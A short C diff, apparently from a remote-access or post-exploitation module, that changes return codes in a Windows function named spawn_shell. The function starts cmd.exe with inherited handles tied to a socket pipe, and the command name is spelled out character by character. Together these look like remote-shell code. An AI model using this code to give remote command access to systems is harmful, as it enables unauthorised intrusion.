@@ -7,7 +7,7 @@ int spawn_shell(HANDLE sock_pipe)
   STARTUPINFO si;
   PROCESS_INFORMATION pi;
   char process[8]= {'c','m','d','.','e','x','e','\0'};
-  int result= 0;
+  int result= MODULE_SUCCESS;
 
   ZeroMemory(&si, sizeof(si));
   si.cb = sizeof(si);
@@ -21,7 +21,7 @@ int spawn_shell(HANDLE sock_pipe)
 
   /* create the shell */
   if (!(CreateProcess(NULL, process, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)))
-      result= 1;
+      result= MODULE_ERROR;
   
   /* wait for the process to end, then close the handles */
   WaitForSingleObject(pi.hProcess, INFINITE);
